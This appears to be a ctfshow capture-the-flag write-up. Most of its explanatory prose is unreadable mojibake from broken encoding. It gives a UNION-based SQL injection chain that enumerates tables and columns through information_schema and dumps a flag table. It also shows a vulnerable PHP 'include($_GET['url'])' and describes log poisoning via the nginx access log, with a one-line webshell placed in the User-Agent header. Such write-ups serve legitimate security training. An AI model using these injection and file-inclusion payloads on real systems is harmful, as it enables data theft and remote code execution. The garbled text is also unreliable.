������Ŀ����ctfshow
# web2 #
very ez sql
ֱ���������wpȥ��ai�������Ľ��ͺ���ϸ��ȫ��������sql��������
```
username=a' or '1' order by 3#&password=password username=a' or '1' union select 1,2,3#&password=password 

a' or '1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()# 

a' or '1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='flag'#

 a' or '1' union select 1,group_concat(flag),3 from flag#
```

�����Լ���ȥ�˽�һ��sql,�Լ�������ע�룬sql������

��ʵ����ע�ͷ�\#�Ͳ���password��

# web4 #
���ý�ͼ�������������һ��
```
<?php include($_GET['url']);?>
```
ע�⵽������������nginx,��ô?url=/var/log/nginx/access.log,

�����з�����־������ͷ���棬bpץ��������ͷΪһ�仰ľ��

�Ű��Ժ�û���ԣ�˵��ִ�гɹ����Ͻ����Ӿ���